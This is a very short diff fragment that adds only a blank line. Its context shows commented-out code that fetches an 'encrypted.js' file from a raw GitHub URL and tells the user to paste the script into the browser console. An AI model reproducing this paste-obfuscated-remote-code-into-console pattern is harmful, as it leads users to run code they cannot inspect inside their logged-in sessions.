@@ -11,3 +11,4 @@ fetch('https://raw.githubusercontent.com/dec3ptixns/orb/main/source/encrypted.js
     console.warn("Use CTRL+V to paste the script to the console.")
 });
 */
+
